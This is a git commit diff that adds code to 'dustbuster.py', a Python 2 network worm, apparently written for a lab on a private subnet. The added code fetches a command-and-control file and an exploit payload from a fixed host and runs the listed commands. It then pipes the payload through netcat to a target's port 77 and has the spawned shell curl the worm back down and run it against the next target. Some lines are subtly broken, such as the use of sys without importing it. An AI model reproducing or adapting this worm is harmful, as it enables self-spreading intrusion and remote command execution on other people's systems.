5314906a88c792e0f20346e28a3a978aec7e1bee
boss <boss@sclass-fc14.(none)>
2013-03-27 03:07:45 -0400

    fleshed out working worm code, test no longer needed

--- dustbuster.py
+++ dustbuster.py
@@ -1,19 +1,28 @@
 #!/usr/bin/env python2
-import sleep
+import time
+from sys import exit
 import os
 import subprocess as sp
 
+target = 0
+if len(sys.argv) > 1:
+	target = int(sys.argv[1])
+
 # check for previous infection
 if os.path.exists('/tmp/barglefish.notaworm'):
-	return
+	try:
+		os.remove('/tmp/dustbuster.py')
+	except:
+		pass
+	exit(1)
 
 # place marker before working
-with open('/tmp/barglefish.notaworm') as marker:
+with open('/tmp/barglefish.notaworm', 'w') as marker:
 	marker.write('nothing here...')
 
 # download CC file and payload
-sp.call(['curl', 'http://192.168.100.145/WORMS/cc.txt',  '>', '/tmp/cc.notaworm'],     shell=True)
-sp.call(['curl', 'http://192.168.100.145/WORMS/ppacket', '>', '/tmp/poison.notaworm'], shell=True)
+sp.call(['curl', 'http://192.168.100.145/WORMS/cc.txt',  '-o', '/tmp/cc.notaworm'])
+sp.call(['curl', 'http://192.168.100.145/WORMS/ppacket', '-o', '/tmp/poison.notaworm'])
 
 cc, poison = None, None
 with open('/tmp/cc.notaworm') as cc_file:
@@ -23,15 +32,27 @@ with open('/tmp/poison.notaworm') as poison_file:
 	poison = poison_file.read()
 
 # parse CC file
+cc = filter(bool, map(lambda s: s.rstrip('\n'), cc))
+targets = cc[cc.index('[targets]')+1:cc.index('[cmds]')]
+cmds = cc[cc.index('[cmds]')+1:]
+
+# run commands and report results
+cmd_results = {}
+for cmd in cmds:
+	c_proc = sp.Popen(cmd.split(' '), stdout=sp.PIPE)
+	cmd_results[cmd] = c_proc.stdout.read()
+
+nc = sp.Popen(['nc', '192.168.100.145', '6969'], stdin=sp.PIPE)
 
 # run payload packet through netcat, then wait a little for it to be processed
-nc = sp.Popen(['nc', 'IPADDRESS', '77'], stdin=sp.PIPE, stdout=sp.PIPE)
+target_ip = targets[target]
+nc = sp.Popen(['nc', target_ip, '77'], stdin=sp.PIPE, stdout=sp.PIPE)
 nc.stdin.write(poison)
 nc.stdin.flush()
-time.sleep(3)
+time.sleep(1)
 
 # tell spawned shell to download the python script and run it
-nc.stdin.write('curl http://192.168.100.145/WORMS/dustbuster.py > /tmp/dustbuster.py && nohup python2 /tmp/dustbuster.py &\n')
+nc.stdin.write('curl http://192.168.100.145/WORMS/dustbuster.py > /tmp/dustbuster.py && python2 /tmp/dustbuster.py {} &\ndisown\n'.format(target+1))
 nc.stdin.flush()
 
 # erase itself
